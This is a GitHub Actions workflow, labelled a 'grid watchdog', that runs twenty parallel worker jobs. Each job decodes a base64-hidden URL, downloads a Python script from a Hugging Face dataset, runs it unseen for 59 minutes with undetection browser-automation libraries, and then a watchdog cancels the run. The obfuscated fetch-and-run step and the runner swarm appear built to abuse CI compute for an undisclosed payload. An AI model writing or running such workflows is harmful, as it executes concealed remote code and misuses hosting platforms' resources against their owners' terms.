name: Obsidian Grid Watchdog

on:
  workflow_dispatch:

concurrency:
  group: ob-grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog Timer: pauses for 59 minutes then aborts the run
  # =================================================================
  grid-watchdog:
    name: "Grid Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      HOLD_SECONDS: 3540
    steps:
      - name: Start Watchdog Timer
        run: |
          echo "[WATCHDOG] Active for workflow run: ${{ github.run_id }}"
          echo "[WATCHDOG] Waiting ${HOLD_SECONDS}s before triggering abort."

          sleep "${HOLD_SECONDS}"

          echo "[WATCHDOG] Window elapsed — sending run cancellation request."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHDOG] Cancellation request sent."

  # =================================================================
  # Worker Swarm: concurrent execution across alphanumeric workers
  # =================================================================
  swarm-workers:
    name: "Unit-${{ matrix.unit_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        unit_code: [a101, b202, c303, d404, e505, f606, g707, h808, j909, k110, m111, n112, p113, q114, r115, s116, t117, u118, v119, w120]

    steps:
      # ---------------------------------------------------------------
      # Phase 1: System setup
      # ---------------------------------------------------------------
      - name: Prepare Environment
        run: |
          echo "[SETUP] Preparing Unit-${{ matrix.unit_code }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # ---------------------------------------------------------------
      # Phase 2: Fetch runner script
      # ---------------------------------------------------------------
      - name: Fetch Runner Script
        run: |
          echo "[FETCH] Retrieving remote script..."
          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$TARGET_URL" -o app_worker.py
          echo "[FETCH] Script saved locally."

      # ---------------------------------------------------------------
      # Phase 3: Dependencies
      # ---------------------------------------------------------------
      - name: Install Dependencies
        run: |
          echo "[DEPS] Installing Python dependencies..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ---------------------------------------------------------------
      # Phase 4: Execute script with 59-minute limit
      # ---------------------------------------------------------------
      - name: Run Worker Script
        run: |
          echo ">> Starting script on Unit-${{ matrix.unit_code }}..."

          python3 app_worker.py &
          PROC_ID=$!

          echo ">> Running in background with 3540s cap."

          sleep 3540

          if kill -0 "$PROC_ID" 2>/dev/null; then
            echo ">> Time cap reached — stopping process."
            kill -9 "$PROC_ID"
            echo ">> Process stopped."
          else
            echo ">> Process finished early."
          fi
